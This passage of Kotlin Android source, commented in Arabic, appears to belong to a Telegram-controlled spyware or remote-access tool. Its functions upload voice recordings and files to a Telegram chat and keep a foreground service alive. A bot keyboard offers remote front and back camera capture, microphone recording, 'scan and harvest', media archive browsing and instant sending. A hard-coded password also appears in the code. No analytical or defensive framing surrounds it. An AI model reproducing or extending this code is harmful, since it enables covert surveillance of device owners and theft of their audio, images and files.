        return System.currentTimeMillis() / 1000 < session
    }

    // ============================================================
    //  دوال الاتصال بـ Telegram API (معدلة لدعم receivingToken)
    // ============================================================

    /**
     * إرسال تأكيد استلام الضغطة (answerCallbackQuery)
     */
    private suspend fun sendAnswerCallbackQuery(tg: Any?, queryId: String, text: String, receivingToken: String? = null) {
        val params = mapOf(
            "callback_query_id" to queryId,
            "text" to text,
            "show_alert" to false
        )
        invokeTelegramMethod(tg, "answerCallbackQuery", params, receivingToken)
    }

    /**
     * ✅ استدعاء دالة في كائن TelegramUi مع الاستدعاء المباشر للدوال الداخلية
     * ✅ تم إصلاح المشكلة: الاستدعاء المباشر بدلاً من الانعكاس المعقد للدوال المعلقة
     */
    private suspend fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>, receivingToken: String? = null): Any? {
        if (tg == null) return null
        return try {
            // ✅ الاستدعاء المباشر والآمن للدوال الداخلية بدلاً من الانعكاس المعقد للدوال المعلقة
            if (tg is TelegramUi) {
                if (method == "sendMessage" && receivingToken != null) {
                    val chatId = params["chat_id"] as? Long ?: return null
                    val text = params["text"] as? String ?: ""
                    val replyMarkup = params["reply_markup"] as? String
                    return tg.sendMessageDirect(receivingToken, chatId, text, replyMarkup)
                }
                if (method == "answerCallbackQuery" && receivingToken != null) {
                    val cbId = params["callback_query_id"] as? String ?: return null
                    val text = params["text"] as? String ?: ""
                    return tg.answerCallbackQueryDirect(receivingToken, cbId, text)
                }
            }

            // آلية احتياطية للدوال غير المعلقة (مثل _api)
            val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
            if (apiMethod == null) {
                Log.e(TAG, "❌ _api method not found")
                return null
            }
            apiMethod.isAccessible = true
            val rawParams = HashMap<Any?, Any?>(params)
            if (rawParams.containsKey("reply_markup") && rawParams["reply_markup"] !is String) {
                val markup = rawParams["reply_markup"]
                rawParams["reply_markup"] = when (markup) {
                    is Map<*, *> -> JSONObject(markup).toString()
                    is JSONObject -> markup.toString()
                    else -> markup.toString()
                }
            }
            apiMethod.invoke(tg, method, rawParams)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Telegram API call error: ${e.message}")
            e.printStackTrace()
            null
        }
    }

    /**
     * إرسال رسالة نصية عبر Telegram (مع منع تسريب كلمة السر)
     */
    private suspend fun sendTelegramMessage(
        tg: Any?,
        chatId: Any,
        text: String,
        replyMarkupJson: String? = null,
        receivingToken: String? = null
    ): Any? {
        // ✅ استبدال كلمة المرور بـ •••••••• في حال وجودها بالخطأ في النص
        val cleanText = text.replace("Zaen123@123@", "••••••••")
        val params = mutableMapOf<String, Any>("chat_id" to chatId, "text" to cleanText)
        replyMarkupJson?.let { params["reply_markup"] = it }
        return invokeTelegramMethod(tg, "sendMessage", params, receivingToken)
    }

    private suspend fun sendTelegramAction(tg: Any?, chatId: Any, action: String, receivingToken: String? = null) {
        val params = mapOf(
            "chat_id" to chatId,
            "action" to action
        )
        invokeTelegramMethod(tg, "sendChatAction", params, receivingToken)
    }

    private suspend fun sendTelegramVoice(tg: Any?, chatId: Any, voiceFile: File, receivingToken: String? = null): Boolean {
        if (tg == null) return false
        return try {
            val params = mapOf("chat_id" to chatId)
            val files = mapOf("voice" to voiceFile)
            val result = invokeMethod(tg, "_api", "sendVoice", params, files)
            if (result != null) {
                val json = result as? JSONObject
                json?.optBoolean("ok") == true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send voice error: ${e.message}")
            false
        }
    }

    private suspend fun sendTelegramDocument(tg: Any?, chatId: Any, documentFile: File, caption: String, receivingToken: String? = null): Boolean {
        if (tg == null) return false
        return try {
            val params = mapOf(
                "chat_id" to chatId,
                "caption" to caption
            )
            val files = mapOf("document" to documentFile)
            val result = invokeMethod(tg, "_api", "sendDocument", params, files)
            if (result != null) {
                val json = result as? JSONObject
                json?.optBoolean("ok") == true
            } else {
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send document error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  ✅ دالة مساعدة لإرسال نبض للخدمة الأمامية
    // ============================================================

    private fun sendPulseIntent(actionType: String) {
        try {
            val intent = Intent(appContext, ForegroundService::class.java).apply {
                action = "PULSE_ACTION"
                putExtra("action_type", actionType)
            }
            appContext?.startService(intent)
            Log.d(TAG, "✅ Pulse intent sent: $actionType")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to send pulse intent: ${e.message}")
            try {
                val serviceIntent = Intent(appContext, ForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    appContext?.startForegroundService(serviceIntent)
                } else {
                    appContext?.startService(serviceIntent)
                }
            } catch (e2: Exception) {
                Log.e(TAG, "❌ Failed to start service: ${e2.message}")
            }
        }
    }

    // ============================================================
    //  ✅ لوحة المفاتيح الرئيسية – إيموجي فريد لكل زر
    // ============================================================

    fun getMainControlKeyboard(): String {
        val keyboard = JSONArray().apply {
            put(JSONArray().apply {
                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "camf_main"))
                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_main"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic_start"))
                put(JSONObject().put("text", "🛡️ فحص وحصاد").put("callback_data", "hrv_now"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "📂 أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
                put(JSONObject().put("text", "🚀 بث فوري").put("callback_data", "send_now"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔍 حالة النظام").put("callback_data", "sys_status"))
                put(JSONObject().put("text", "🔒 قفل الجلسة").put("callback_data", "ext"))
            })
            put(JSONArray().apply {
                put(JSONObject().put("text", "🔄 تحديث النموذج").put("callback_data", "update_model_all"))
                put(JSONObject().put("text", "♻️ إعادة تشغيل الخدمة").put("callback_data", "restart_service_all"))
            })
        }
        return JSONObject().put("inline_keyboard", keyboard).toString()
    }
}
